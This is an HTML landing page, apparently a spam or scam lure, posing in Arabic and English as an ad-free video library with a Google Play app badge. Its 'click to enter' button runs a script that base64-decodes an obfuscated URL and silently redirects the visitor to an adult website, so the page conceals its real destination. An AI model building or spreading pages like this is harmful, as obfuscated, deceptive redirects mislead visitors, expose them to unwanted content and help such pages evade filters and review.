<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>📽️ مكتبة الفيديو العربي المجاني</title>
  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
  <style>
    * { box-sizing: border-box; }
    body {
      margin: 0;
      padding: 0;
      font-family: 'Cairo', sans-serif;
      background-color: #f5f7fa;
      color: #1f2937;
      direction: rtl;
    }
    header {
      background-color: #ffffff;
      padding: 0;
      text-align: center;
    }
    .hero-img {
      width: 100%;
      max-height: 300px;
      object-fit: cover;
      display: block;
    }
    header h1 {
      font-size: 28px;
      margin: 10px 0 5px;
    }
    header p {
      font-size: 16px;
      margin: 0 0 20px;
      color: #374151;
    }
    .main {
      max-width: 960px;
      margin: 0 auto;
      padding: 30px 20px;
    }
    .video-preview-wrapper {
      display: flex;
      flex-wrap: wrap;
      align-items: center;
      justify-content: space-between;
      gap: 20px;
      margin-bottom: 30px;
    }
    .video-preview {
      flex: 1 1 60%;
      position: relative;
      width: 100%;
      padding-top: 56.25%;
      background: #000 url('https://sarasmith199536.github.io/ttgg-landing/Player1/F/F1.jpg') center/cover no-repeat;
      border-radius: 16px;
    }
    .play-badge {
      flex: 1 1 35%;
      text-align: center;
    }
    .play-badge img {
      height: 60px;
      cursor: pointer;
    }
    .cta-btn {
      display: inline-block;
      background-color: #00bcd4;
      color: white;
      font-size: 18px;
      padding: 14px 30px;
      border: none;
      border-radius: 10px;
      text-decoration: none;
      transition: background-color 0.3s ease;
      margin-top: 20px;
      font-weight: bold;
      cursor: pointer;
    }
    .cta-btn:hover {
      background-color: #0097a7;
    }
    .download-hint {
      margin-top: 20px;
      text-align: right;
      display: flex;
      flex-direction: row-reverse;
      align-items: center;
      gap: 12px;
      direction: rtl;
    }
    .arrow-icon {
      width: 40px;
      height: auto;
    }
    .hint-text {
      font-size: 14px;
      color: #1f2937;
    }
    .hint-text strong {
      display: block;
      color: #111;
      font-size: 16px;
    }
    .section-title {
      font-size: 22px;
      margin-bottom: 20px;
      color: #0f172a;
    }
    .features {
      display: flex;
      flex-wrap: wrap;
      gap: 16px;
      margin-bottom: 40px;
    }
    .feature-card {
      flex: 1 1 calc(50% - 16px);
      background: white;
      border-radius: 12px;
      padding: 16px;
      box-shadow: 0 6px 12px rgba(0, 0, 0, 0.06);
      font-size: 15px;
    }
    .feature-card::before {
      content: "✔️";
      margin-left: 8px;
      color: #00bcd4;
    }
    .recommendations {
      display: grid;
      grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
      gap: 16px;
      margin-bottom: 40px;
    }
    .recommendation {
      background: white;
      border-radius: 12px;
      overflow: hidden;
      box-shadow: 0 6px 12px rgba(0,0,0,0.08);
      text-align: center;
    }
    .recommendation img {
      width: 100%;
      height: 100px;
      object-fit: cover;
    }
    .recommendation p {
      margin: 10px;
      font-size: 14px;
    }
    .cta-section {
      text-align: center;
      background-color: #e0f7fa;
      padding: 30px 20px;
      border-radius: 16px;
    }
    footer {
      text-align: center;
      padding: 20px;
      font-size: 13px;
      color: #6b7280;
    }
    .footer-links {
      margin-top: 10px;
    }
    .footer-links a {
      margin: 0 10px;
      color: #00bcd4;
      text-decoration: none;
    }
    @media (max-width: 600px) {
      .feature-card {
        flex: 1 1 100%;
      }
      .video-preview-wrapper {
        flex-direction: column;
      }
    }
  </style>
</head>
<body>
  <header>
    <img class="hero-img" src="https://sarasmith199536.github.io/ttgg-landing/Player1/Top/Top1.1.jpg" alt="صورة امرأة عربية">
    <h1 id="main-title">📽️ مكتبة الفيديو العربي المجاني</h1>
    <p id="subtitle">اكتشف أفضل محتوى فيديو مجاني باللغة العربية، بلا إعلانات مزعجة</p>
  </header>

  <section class="main">
    <div class="video-preview-wrapper">
      <div class="video-preview"></div>
      <div class="play-badge">
        <a href="https://play.google.com/store/apps/details?id=com.hdvideo.player.offline" target="_blank">
          <img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg" alt="Get it on Google Play">
        </a>
        <div class="cta-btn" onclick="goToHiddenLink()" id="cta-btn">انقر هنا للدخول</div>
        <div class="download-hint">
          <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/fd/Curved_arrow_left.svg/120px-Curved_arrow_left.svg.png" alt="arrow" class="arrow-icon">
          <div class="hint-text">
            <strong id="hint-main">احصل على التطبيق الآن</strong>
            <span id="hint-sub">انقر للتحميل أو المشاهدة</span>
          </div>
        </div>
      </div>
    </div>
  </section>

  <footer>
    <div id="footer-text">جميع الحقوق محفوظة © 2025 - دليل الفيديو العربي</div>
    <div class="footer-links">
      <a href="/ttgg-landing/privacy.html" id="privacy">سياسة الخصوصية</a>
      <a href="/ttgg-landing/about.html" id="about">من نحن</a>
      <a href="/ttgg-landing/contact.html" id="contact">اتصل بنا</a>
    </div>
  </footer>

  <script>
    function goToHiddenLink() {
      const encoded = "aHR0cHM6Ly9wb3JuZHVkZS5vbmxpbmUvbWVRUg==";
      const link = atob(encoded);
      window.location.href = link;
    }

    const lang = navigator.language || navigator.userLanguage;
    if (lang.startsWith('en')) {
      document.documentElement.lang = 'en';
      document.documentElement.dir = 'ltr';
      document.getElementById("main-title").textContent = "📽️ Free Arabic Video Library";
      document.getElementById("subtitle").textContent = "Discover top-quality Arabic video content without annoying ads";
      document.getElementById("cta-btn").textContent = "Click to Enter";
      document.getElementById("footer-text").textContent = "All rights reserved © 2025 - Arabic Video Guide";
      document.getElementById("privacy").textContent = "Privacy Policy";
      document.getElementById("about").textContent = "About Us";
      document.getElementById("contact").textContent = "Contact Us";
      document.getElementById("hint-main").textContent = "Get the app now";
      document.getElementById("hint-sub").textContent = "Tap to download or watch";
    }
  </script>
</body>
</html>
